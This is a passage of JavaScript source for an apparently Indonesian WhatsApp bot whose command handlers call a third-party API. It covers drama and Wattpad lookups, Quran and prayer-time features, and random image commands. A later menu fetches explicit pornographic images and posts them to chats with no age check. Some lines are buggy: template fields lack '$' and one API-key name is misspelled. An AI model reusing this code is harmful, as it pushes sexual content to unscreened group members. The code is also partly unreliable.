let teks = `⭔ *Title* : ${data.result.title}\n`
teks += `⭔ *Link* : ${data.result.link}\n`
teks += `⭔ *Genre* : ${data.result.genre}\n`
teks += `⭔ *Views* : ${data.result.views}\n`
teks += `⭔ *Duration* : ${data.result.duration}\n`
teks += `⭔ *Tahun* : ${data.result.tahun}\n`
teks += `⭔ *Rating* : ${data.result.rating}\n`
teks += `⭔ *Desc* : ${data.result.desc}\n`
teks += `⭔ *Actors* : ${data.result.actors.join(", ")}\n`
teks += `⭔ *Location* : ${data.result.location}\n`
teks += `⭔ *Date Release* : ${data.result.date_release}\n`
teks += `⭔ *Language* : ${data.result.language}\n`
teks += `⭔ *Link Download* : ${data.result.link_dl}`
sock.sendMessage(m.chat, { image: { url: data.result.thumbnail }, caption: teks }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "drakorongoing":
try{
if (m.isGroup && !isSewa) return onlySewa()
let { data } = await axios.get(`https://api.lolhuman.xyz/api/drakorongoing?apikey=${lolhumankey}`)
let teks = "Ongoing Drakor\n\n"
for (let x of data.result) {
teks += `⭔ *Title* : ${x.title}\n`
teks += `⭔ *Link* : ${x.link}\n`
teks += `⭔ *Thumbnail* : ${x.thumbnail}\n`
teks += `⭔ *Year* : ${x.category}\n`
teks += `⭔ *Total Episode* : ${x.total_episode}\n`
teks += `⭔ *Genre* : ${x.genre.join(", ")}\n\n────────────────────────\n\n`
}
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "wattpad":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.wattpad.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/wattpad?apikey=${lolhumankey}&url=${encodeURI(text)}`)
let teks = `⭔ *Title* : ${data.result.title}\n`
teks += `⭔ *Rating* : ${data.result.rating}\n`
teks += `⭔ *Motify date* : ${data.result.modifyDate}\n`
teks += `⭔ *Create date* : ${data.result.createDate}\n`
teks += `⭔ *Word* : ${data.result.word}\n`
teks += `⭔ *Comment* : ${data.result.comment}\n`
teks += `⭔ *Vote* : ${data.result.vote}\n`
teks += `⭔ *Reader* : ${data.result.reader}\n`
teks += `⭔ *Pages* : ${data.result.pages}\n`
teks += `⭔ *Description* : ${data.result.desc}\n\n`
teks += `⭔ *Story* : \n${data.result.story}`
sock.sendMessage(m.chat, { image: { url: data.result.photo }, caption: teks }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "wattpadsearch":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.wattpadsearch.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/wattpadsearch?apikey=${lolhumankey}&query=${encodeURI(text)}`)
let teks = "Wattpad Seach : \n"
for (let x of data.result) {
teks += `⭔ *Title* : ${x.title}\n`
teks += `⭔ *Url* : ${x.url}\n`
teks += `⭔ *Part* : ${x.parts}\n`
teks += `⭔ *Motify date* : ${x.modifyDate}\n`
teks += `⭔ *Create date* : ${x.createDate}\n`
teks += `⭔ *Coment count* : ${x.commentCount}\n\n────────────────────────\n\n`
}
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "filmapik":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.filmapik.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/filmapik?apikey=${lolhumankey}&query=${encodeURI(text)}`)
let teks = "Film Apik Seach : \n"
for (let x of data.result) {
teks += `⭔ *Title* : ${x.title}\n`
teks += `⭔ *Rating* : {x.rating}\n`
teks += `⭔ *Episode* : {x.episode}\n`
teks += `⭔ *Official Web* : {x.officialWeb}\n\n────────────────────────\n\n`
}
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
//=========================[ FITUR ISLAMI ]=========================\\
case "surah":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (args[0] == "type" && args[1] && !args[2]) {
sock.sendButMessage(m.chat, "SURAH", copyrightnya, [ 
{ buttonId: `${prefix + command} audio ${args[1]}`, buttonText: { displayText: `audio` }, type: 1 }, 
{ buttonId: `${prefix + command} information ${args[1]}`, buttonText: { displayText: `information` }, type: 1 }, ], setQuoted) 
} else if (args[0] == "audio" && args[1] && !args[2]) {
let { data } = await axios.get(`https://api.lolhuman.xyz/api/quran/${args[1]}?apikey=${lolhumankey}`)
let listnya = []
for (let x of data.result.ayat) {
listnya.push({
title: `AYAT ${x.ayat}`,
rowId: `${prefix + command} audio ${args[1]} ${x.ayat}`,
description: `AYAT KE ${x.ayat}`
})
}
const sections = [
{title: "PLEASE SELECT",
rows: listnya }]
const listMessage = {
text: "SURAH AUDIO",
buttonText: "Click Here",
sections
}
sock.sendMessage(m.chat, listMessage, { quoted: setQuoted })
} else if (args[0] == "information" && args[1] && !args[2]) {
let { data } = await axios.get(`https://api.lolhuman.xyz/api/quran/${args[1]}?apikey=${lolhumankey}`)
let listnya = []
for (let x of data.result.ayat) {
listnya.push({
title: `AYAT ${x.ayat}`,
rowId: `${prefix + command} information ${args[1]} ${x.ayat}`,
description: `AYAT KE ${x.ayat}`
})
}
const sections = [
{title: "PLEASE SELECT",
rows: listnya }]
const listMessage = {
text: "SURAH INFORMATION",
buttonText: "Click Here",
sections
}
sock.sendMessage(m.chat, listMessage, { quoted: setQuoted })
} else if (args[0] == "audio" && args[1] && args[2]) {
let number1 = Number(args[1])
let number2 = Number(args[2])
sock.sendMessage(m.chat, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${number1}/${number2}?apikey=${lolhumankey}` }, mimetype: "audio/mp4" }) 
} else if (args[0] == "information" && args[1] && args[2]) {
let number1 = Number(args[1])
let number2 = Number(args[2])
let { data } = await axios.get(`https://api.lolhuman.xyz/api/quran/${number1}/${number2}?apikey=${lolhumankey}`)
let teks = `${data.result.surah} : \n`
teks += `⭔ *Ayat* : ${data.result.ayat[0].ayat}\n`
teks += `⭔ *Arab* : ${data.result.ayat[0].arab}\n`
teks += `⭔ *Indonesia* : ${data.result.ayat[0].indonesia}\n`
teks += `⭔ *Latin* : ${data.result.ayat[0].latin}`
setReply(teks)
} else {
const sections = [{
title: `PLEASE SELECT`,
rows: [
{title: "Al-Fatihah", rowId: `${prefix + command} type 1`, description: "Surah Al-Fatihah"},
{title: "Al-Baqarah", rowId: `${prefix + command} type 2`, description: "Surah Al-Baqarah"},
{title: "Ali `Imran", rowId: `${prefix + command} type 3`, description: "Surah Ali `Imranh"},
{title: "An-Nisa", rowId: `${prefix + command} type 4`, description: "Surah An-Nisa"},
{title: "Al-Ma`idah", rowId: `${prefix + command} type 5`, description: "Surah Al-Ma`idah"},
{title: "Al-An`am", rowId: `${prefix + command} type 6`, description: "Surah Al-An`am"},
{title: "Al-A`raf", rowId: `${prefix + command} type 7`, description: "Surah Al-A`raf"},
{title: "Al-Anfal", rowId: `${prefix + command} type 8`, description: "Surah Al-Anfal"},
{title: "At-Taubah", rowId: `${prefix + command} type 9`, description: "Surah At-Taubah"},
{title: "Yunus", rowId: `${prefix + command} type 10`, description: "Surah Yunus"},
{title: "Hud", rowId: `${prefix + command} type 11`, description: "Surah Hud"},
{title: "Yusuf", rowId: `${prefix + command} type 12`, description: "Surah Yusuf"},
{title: "Ar-Ra`d", rowId: `${prefix + command} type 13`, description: "Surah Ar-Ra`d"},
{title: "Ibrahim", rowId: `${prefix + command} type 14`, description: "Surah Ibrahim"},
{title: "Al-Hijr", rowId: `${prefix + command} type 15`, description: "Surah Al-Hijr"},
{title: "An-Nahl", rowId: `${prefix + command} type 16`, description: "Surah An-Nahl"},
{title: "Al-Isra", rowId: `${prefix + command} type 17`, description: "Surah Al-Isra"},
{title: "Al-Kahf", rowId: `${prefix + command} type 18`, description: "Surah Al-Kahf"},
{title: "Maryam", rowId: `${prefix + command} type 19`, description: "Surah Maryam"},
{title: "Ta Ha", rowId: `${prefix + command} type 20`, description: "Surah Ta Ha"},
{title: "Al-Anbiya", rowId: `${prefix + command} type 21`, description: "Surah Al-Anbiya"},
{title: "Al-Hajj", rowId: `${prefix + command} type 22`, description: "Surah Al-Hajj"},
{title: "Al-Mu’minun", rowId: `${prefix + command} type 23`, description: "Surah Al-Mu’minun"},
{title: "An-Nur", rowId: `${prefix + command} type 24`, description: "Surah An-Nur"},
{title: "Al-Furqan", rowId: `${prefix + command} type 25`, description: "Surah Al-Furqan"},
{title: "Asy-Syu`ara", rowId: `${prefix + command} type 26`, description: "Surah Asy-Syu`ara"},
{title: "An-Naml", rowId: `${prefix + command} type 27`, description: "Surah An-Naml"},
{title: "Al-Qasas", rowId: `${prefix + command} type 28`, description: "Surah Al-Qasas"},
{title: "Al-`Ankabut", rowId: `${prefix + command} type 29`, description: "Surah Al-`Ankabut"},
{title: "Ar-Rum", rowId: `${prefix + command} type 30`, description: "Surah Ar-Rum"},
{title: "Luqman", rowId: `${prefix + command} type 31`, description: "Surah Luqman"},
{title: "As-Sajdah", rowId: `${prefix + command} type 32`, description: "Surah As-Sajdah"},
{title: "Al-Ahzab", rowId: `${prefix + command} type 33`, description: "Surah Al-Ahzab"},
{title: "Saba", rowId: `${prefix + command} type 34`, description: "Surah Saba"},
{title: "Fatir", rowId: `${prefix + command} type 35`, description: "Surah Fatir"},
{title: "Ya Sin", rowId: `${prefix + command} type 36`, description: "Surah Ya Sin"},
{title: "As-Saffat", rowId: `${prefix + command} type 37`, description: "Surah As-Saffat"},
{title: "Sad", rowId: `${prefix + command} type 38`, description: "Surah Sad"},
{title: "Az-Zumar", rowId: `${prefix + command} type 39`, description: "Surah Az-Zumar"},
{title: "Ghafir", rowId: `${prefix + command} type 40`, description: "Surah Ghafir"},
{title: "Fussilat", rowId: `${prefix + command} type 41`, description: "Surah Fussilat"},
{title: "Asy-Syura", rowId: `${prefix + command} type 42`, description: "Surah Asy-Syura"},
{title: "Az-Zukhruf", rowId: `${prefix + command} type 43`, description: "Surah Az-Zukhruf"},
{title: "Ad-Dukhan", rowId: `${prefix + command} type 44`, description: "Surah Ad-Dukhan"},
{title: "Al-Jasiyah", rowId: `${prefix + command} type 45`, description: "Surah Al-Jasiyah"},
{title: "Al-Ahqaf", rowId: `${prefix + command} type 46`, description: "Surah Al-Ahqaf"},
{title: "Muhammad", rowId: `${prefix + command} type 47`, description: "Surah Muhammad"},
{title: "Al-Fath", rowId: `${prefix + command} type 48`, description: "Surah Al-Fath"},
{title: "Al-Hujurat", rowId: `${prefix + command} type 49`, description: "Surah Al-Hujurat"},
{title: "Qaf", rowId: `${prefix + command} type 50`, description: "Surah Qaf"},
{title: "Az-Zariyat", rowId: `${prefix + command} type 51`, description: "Surah Az-Zariyat"},
{title: "At-Tur", rowId: `${prefix + command} type 52`, description: "Surah At-Tur"},
{title: "An-Najm", rowId: `${prefix + command} type 53`, description: "Surah An-Najm"},
{title: "Al-Qamar", rowId: `${prefix + command} type 54`, description: "Surah Al-Qamar"},
{title: "Ar-Rahman", rowId: `${prefix + command} type 55`, description: "Surah Ar-Rahman"},
{title: "Al-Waqi`ah", rowId: `${prefix + command} type 56`, description: "Surah Al-Waqi`ah"},
{title: "Al-Hadid", rowId: `${prefix + command} type 57`, description: "Surah Al-Hadid"},
{title: "Al-Mujadilah", rowId: `${prefix + command} type 58`, description: "Surah Al-Mujadilah"},
{title: "Al-Hasyr", rowId: `${prefix + command} type 59`, description: "Surah Al-Hasyr"},
{title: "Al-Mumtahanah", rowId: `${prefix + command} type 60`, description: "Surah Al-Mumtahanah"},
{title: "As-Saff", rowId: `${prefix + command} type 61`, description: "Surah As-Saff"},
{title: "Al-Jumu`ah", rowId: `${prefix + command} type 62`, description: "Surah Al-Jumu`ah"},
{title: "Al-Munafiqun", rowId: `${prefix + command} type 63`, description: "Surah Al-Munafiqun"},
{title: "At-Tagabun", rowId: `${prefix + command} type 64`, description: "Surah At-Tagabun"},
{title: "At-Talaq", rowId: `${prefix + command} type 65`, description: "Surah At-Talaq"},
{title: "At-Tahrim", rowId: `${prefix + command} type 66`, description: "Surah At-Tahrim"},
{title: "Al-Mulk", rowId: `${prefix + command} type 67`, description: "Surah Al-Mulk"},
{title: "Al-Qalam", rowId: `${prefix + command} type 68`, description: "Surah Al-Qalam"},
{title: "Al-Haqqah", rowId: `${prefix + command} type 69`, description: "Surah Al-Haqqah"},
{title: "Al-Ma`arij", rowId: `${prefix + command} type 70`, description: "Surah Al-Ma`arij"},
{title: "Nuh", rowId: `${prefix + command} type 71`, description: "Surah Nuh"},
{title: "Al-Jinn", rowId: `${prefix + command} type 72`, description: "Surah Al-Jinn"},
{title: "Al-Muzzammil", rowId: `${prefix + command} type 73`, description: "Surah Al-Muzzammil"},
{title: "Al-Muddassir", rowId: `${prefix + command} type 74`, description: "Surah Al-Muddassir"},
{title: "Al-Qiyamah", rowId: `${prefix + command} type 75`, description: "Surah Al-Qiyamah"},
{title: "Al-Insan", rowId: `${prefix + command} type 76`, description: "Surah Al-Insan"},
{title: "Al-Mursalat", rowId: `${prefix + command} type 77`, description: "Surah Al-Mursalat"},
{title: "An-Naba", rowId: `${prefix + command} type 78`, description: "Surah An-Naba"},
{title: "An-Nazi`at", rowId: `${prefix + command} type 79`, description: "Surah An-Nazi`at"},
{title: "Abasa", rowId: `${prefix + command} type 80`, description: "Surah Abasa"},
{title: "At-Takwir", rowId: `${prefix + command} type 81`, description: "Surah At-Takwir"},
{title: "Al-Infitar", rowId: `${prefix + command} type 82`, description: "Surah Al-Infitar"},
{title: "Al-Tatfif", rowId: `${prefix + command} type 83`, description: "Surah Al-Tatfif"},
{title: "Al-Insyiqaq", rowId: `${prefix + command} type 84`, description: "Surah Al-Insyiqaq"},
{title: "Al-Buruj", rowId: `${prefix + command} type 85`, description: "Surah Al-Buruj"},
{title: "At-Tariq", rowId: `${prefix + command} type 86`, description: "Surah At-Tariq"},
{title: "Al-A`la", rowId: `${prefix + command} type 87`, description: "Surah Al-A`la"},
{title: "Al-Gasyiyah", rowId: `${prefix + command} type 88`, description: "Surah Al-Gasyiyah"},
{title: "Al-Fajr", rowId: `${prefix + command} type 89`, description: "Surah Al-Fajr"},
{title: "Al-Balad", rowId: `${prefix + command} type 90`, description: "Surah Al-Balad"},
{title: "Asy-Syams", rowId: `${prefix + command} type 91`, description: "Surah Asy-Syams"},
{title: "Al-Lail", rowId: `${prefix + command} type 92`, description: "Surah Al-Lail"},
{title: "Ad-Duha", rowId: `${prefix + command} type 93`, description: "Surah Ad-Duha"},
{title: "Al-Insyirah", rowId: `${prefix + command} type 94`, description: "Surah Al-Insyirah"},
{title: "At-Tin", rowId: `${prefix + command} type 95`, description: "Surah At-Tin"},
{title: "Al-`Alaq", rowId: `${prefix + command} type 96`, description: "Surah Al-`Alaq"},
{title: "Al-Qadr", rowId: `${prefix + command} type 97`, description: "Surah Al-Qadr"},
{title: "Al-Bayyinah", rowId: `${prefix + command} type 98`, description: "Surah Al-Bayyinah"},
{title: "Az-Zalzalah", rowId: `${prefix + command} type 99`, description: "Surah Az-Zalzalah"},
{title: "Al-`Adiyat", rowId: `${prefix + command} type 100`, description: "Surah Al-`Adiyat"},
{title: "Al-Qari`ah", rowId: `${prefix + command} type 101`, description: "Surah Al-Qari`ah"},
{title: "At-Takasur", rowId: `${prefix + command} type 102`, description: "Surah At-Takasur"},
{title: "Al-`Asr", rowId: `${prefix + command} type 103`, description: "Surah Al-`Asr"},
{title: "Al-Humazah", rowId: `${prefix + command} type 104`, description: "Surah Al-Humazah"},
{title: "Al-Fil", rowId: `${prefix + command} type 105`, description: "Surah Al-Fil"},
{title: "Quraisy", rowId: `${prefix + command} type 106`, description: "Surah Quraisy"},
{title: "Al-Ma`un", rowId: `${prefix + command} type 107`, description: "Surah Al-Ma`un"},
{title: "Al-Kausar", rowId: `${prefix + command} type 108`, description: "Surah Al-Kausar"},
{title: "Al-Kafirun", rowId: `${prefix + command} type 109`, description: "Surah Al-Kafirun"},
{title: "An-Nasr", rowId: `${prefix + command} type 110`, description: "Surah An-Nasr"},
{title: "Al-Lahab", rowId: `${prefix + command} type 111`, description: "Surah Al-Lahab"},
{title: "Al-Ikhlas", rowId: `${prefix + command} type 112`, description: "Surah Al-Ikhlas"},
{title: "Al-Falaq", rowId: `${prefix + command} type 113`, description: "Surah Al-Falaq"},
{title: "An-Nas", rowId: `${prefix + command} type 114`, description: "Surah An-Nas"},
]}]
const listMessage = { text: `SURAH`, buttonText: "Click Here", sections }
sock.sendMessage(m.chat, listMessage, { quoted: setQuoted })
}
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "asmaulhusna":
try{
if (m.isGroup && !isSewa) return onlySewa()
let { data } = await axios.get(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${lolhumankey}`)
let teks = "Asmaulhusna : \n"
teks += `⭔ *Latin* : ${data.result.latin}\n`
teks += `⭔ *Arab* :  ${data.result.ar}\n`
teks += `⭔ *Indonesia* :  ${data.result.id}`
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "jadwalsholat":
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.jadwalsholat.query(prefix, command))
try{
let { data } = await axios.get(`https://api.lolhuman.xyz/api/sholat/${encodeURI(text)}?apikey=${lolhumankey}`) 
let teks = "Jadwal Sholat :\n\n"
teks += `⭔ *Wilayah* : ${data.result.wilayah}\n`
teks += `⭔ *Date* : ${data.result.tanggal}\n`
teks += `⭔ *Sahur* : ${data.result.sahur}\n`
teks += `⭔ *Imsak* : ${data.result.imsak}\n`
teks += `⭔ *Subuh* : ${data.result.subuh}\n`
teks += `⭔ *Terbit* : ${data.result.terbit}\n`
teks += `⭔ *Dhuha* : ${data.result.dhuha}\n`
teks += `⭔ *Dzuhur* : ${data.result.dzuhur}\n`
teks += `⭔ *Ashar* : ${data.result.ashar}\n`
teks += `⭔ *Maghrib* : ${data.result.maghrib}\n`
teks += `⭔ *Isya* : ${data.result.isya}`
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "niatsholat":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (args[0] == "subuh" || args[0] == "dzuhur" || args[0] == "ashar" || args[0] == "maghrib" || args[0] == "isya") {
let { data } = await axios.get(`https://api.lolhuman.xyz/api/niatsholat/${args[0]}?apikey=${lolhukankey}`)
let teks = "Niat Sholat :\n\n"
teks += `⭔ *Name* : ${data.result.name}\n`
teks += `⭔ *Arab* : ${data.result.ar}\n`
teks += `⭔ *Indonesia* : ${data.result.id}\n`
teks += `⭔ *Latin* : ${data.result.latin}`
setReply(teks)
} else {
const sections = [{
title: `PLEASE SELECT`,
rows: [
{title: "Subuh", rowId: `${prefix + command} subuh`, description: "Niat Sholat Subuh"},
{title: "Dzuhur", rowId: `${prefix + command} dzuhur`, description: "Niat Sholat Dzuhur"},
{title: "Ashar", rowId: `${prefix + command} ashar`, description: "Niat Sholat Ashar"},
{title: "Maghrib", rowId: `${prefix + command} maghrib`, description: "Niat Sholat Maghrib"},
{title: "Isya", rowId: `${prefix + command} isya`, description: "Niat Sholat Isya"},
]}]
const listMessage = { text: `SURAH`, buttonText: "Click Here", sections }
sock.sendMessage(m.chat, listMessage, { quoted: setQuoted })
}
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "kisahnabi":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.kisahnabi.query(prefix, command)) 
let { data } = await axios.get(`https://api.lolhuman.xyz/api/kisahnabi/${encodeURI(text)}?apikey=${lolhumankey}`) 
let teks = "Kisah Nabi :\n\n"
teks += `⭔ *Name* : ${data.result.name}\n`
teks += `⭔ *Kelahiran* : ${data.result.thn_kelahiran}\n`
teks += `⭔ *Tempat* : ${data.result.place}\n`
teks += `⭔ *Story* :\n${data.result.story}`
setReply(teks) 
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
//=========================[ FITURE RANDOM ]=========================\\
case "couple":{
if (m.isGroup && !isSewa) return onlySewa()
let anu = await fetchJson("https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json")
let random = anu[Math.floor(Math.random() * anu.length)]
sock.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: setQuoted })
sock.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: setQuoted })
}
break
case "bts":
case "exo":
case "cecan":
case "cogan":
case "estetic":
case "blackpink":
try{
if (m.isGroup && !isSewa) return onlySewa()
let result = await getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolhumankey}`)
let buttons = [{ buttonId: `${prefix + command}`, buttonText: { displayText: `➡️Next` }, type: 1 }]
await sock.sendMessage(m.chat, { image: result, caption: mess.success, footer: copyrightnya, buttons: buttons }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "asupan":
try{
if (m.isGroup && !isSewa) return onlySewa()
let { data } = await axios.get(`https://api.lolhuman.xyz/api/asupan?apikey=${lolhumankey}`) 
sock.sendMessage(m.chat, { video: { url: data.result }, mimetype: "video/mp4", caption: mess.success }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
//=========================[ FITUR WUBU MENU ]=========================\\
case "elf":
case "loli":
case "neko":
case "waifu":
case "shota":
case "husbu":
case "elaina":
case "shinobu":
case "kanna":
case "megumin":
case "art":
case "wallnime":
case "bully":
case "cuddle":
case "cry":
case "hug":
case "awoo":
case "kiss":
case "lick":
case "pat":
case "smug":
case "bonk":
case "yeet":
case "blush":
case "smile":
case "wave":
case "highfive":
case "handhold":
case "bite":
case "glomp":
case "slap":
case "kill":
case "happy":
case "wink":
case "poke":
case "dance":
case "cringe":
try{
if (m.isGroup && !isSewa) return onlySewa()
let result = await getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolhumankey}`)
let buttons = [{ buttonId: `${prefix + command}`, buttonText: { displayText: `➡️Next` }, type: 1 }]
await sock.sendMessage(m.chat, { image: result, caption: mess.success, footer: copyrightnya, buttons: buttons }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "feed":
case "kuni":
case "tickle":
case "fox_girl":
case "wallpaper":
try{
if (m.isGroup && !isSewa) return onlySewa()
let result = await getBuffer(`https://api.lolhuman.xyz/api/random2/${command}?apikey=${lolhumankey}`)
let buttons = [{ buttonId: `${prefix + command}`, buttonText: { displayText: `➡️Next` }, type: 1 }]
await sock.sendMessage(m.chat, { image: result, caption: mess.success, footer: copyrightnya, buttons: buttons }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "neko2":
try{
if (m.isGroup && !isSewa) return onlySewa()
let result = await getBuffer(`https://api.lolhuman.xyz/api/random2/neko?apikey=${lolhumankey}`)
let buttons = [{ buttonId: `${prefix + command}`, buttonText: { displayText: `➡️Next` }, type: 1 }]
await sock.sendMessage(m.chat, { image: result, caption: mess.success, footer: copyrightnya, buttons: buttons }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "kiss2":
try{
if (m.isGroup && !isSewa) return onlySewa()
let result = await getBuffer(`https://api.lolhuman.xyz/api/random2/kiss?apikey=${lolhumankey}`)
let buttons = [{ buttonId: `${prefix + command}`, buttonText: { displayText: `➡️Next` }, type: 1 }]
await sock.sendMessage(m.chat, { image: result, caption: mess.success, footer: copyrightnya, buttons: buttons }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "smug2":
try{
if (m.isGroup && !isSewa) return onlySewa()
let result = await getBuffer(`https://api.lolhuman.xyz/api/random2/smug?apikey=${lolhumankey}`)
let buttons = [{ buttonId: `${prefix + command}`, buttonText: { displayText: `➡️Next` }, type: 1 }]
await sock.sendMessage(m.chat, { image: result, caption: mess.success, footer: copyrightnya, buttons: buttons }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "waifu2":
try{
if (m.isGroup && !isSewa) return onlySewa()
let result = await getBuffer(`https://api.lolhuman.xyz/api/random2/waifu?apikey=${lolhumankey}`)
let buttons = [{ buttonId: `${prefix + command}`, buttonText: { displayText: `➡️Next` }, type: 1 }]
await sock.sendMessage(m.chat, { image: result, caption: mess.success, footer: copyrightnya, buttons: buttons }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "cuddle2":
try{
if (m.isGroup && !isSewa) return onlySewa()
let result = await getBuffer(`https://api.lolhuman.xyz/api/random2/cuddle?apikey=${lolhumankey}`)
let buttons = [{ buttonId: `${prefix + command}`, buttonText: { displayText: `➡️Next` }, type: 1 }]
await sock.sendMessage(m.chat, { image: result, caption: mess.success, footer: copyrightnya, buttons: buttons }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
//=========================[ FITUR HARAM MENU ]=========================\\
case "sagiri":
try{
if (m.isGroup && !isSewa) return onlySewa()
let result = await getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolhumankey}`)
let buttons = [{ buttonId: `${prefix + command}`, buttonText: { displayText: `➡️Next` }, type: 1 }]
await sock.sendMessage(m.chat, { image: result, caption: mess.success, footer: copyrightnya, buttons: buttons }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "cum":
case "feet":
case "yuri":
case "trap":
case "ngif":
case "lewd":
case "gasm":
case "anal":
case "holo":
case "tits":
case "erok":
case "solog":
case "feetg":
case "lewdk":
case "pussy":
case "femdom":
case "hentai":
case "eroyuri":
case "cum_jpg":
case "blowjob":
case "futanari":
case "holoero":
case "erokemo":
try{
if (m.isGroup && !isSewa) return onlySewa()
let result = await getBuffer(`https://api.lolhuman.xyz/api/random2/${command}?apikey=${lolhumankey}`)
let buttons = [{ buttonId: `${prefix + command}`, buttonText: { displayText: `➡️Next` }, type: 1 }]
await sock.sendMessage(m.chat, { image: result, caption: mess.success, footer: copyrightnya, buttons: buttons }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "chiisaihentai":
case "yaoi":
case "milf":
case "ecchi":
case "ahegao":
case "hololewd":
case "sideoppai":
case "animefeets":
case "animebooty":
case "animearmpits":
case "hentaifemdom":
case "lewdanimegirls":
case "biganimetiddies":
try{
if (m.isGroup && !isSewa) return onlySewa()
let result = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lolhumankey}`)
let buttons = [{ buttonId: `${prefix + command}`, buttonText: { displayText: `➡️Next` }, type: 1 }]
await sock.sendMessage(m.chat, { image: result, caption: mess.success, footer: copyrightnya, buttons: buttons }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "neko3":
try{
if (m.isGroup && !isSewa) return onlySewa()
let result = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/neko?apikey=${lolhumankey}`)
let buttons = [{ buttonId: `${prefix + command}`, buttonText: { displayText: `➡️Next` }, type: 1 }]
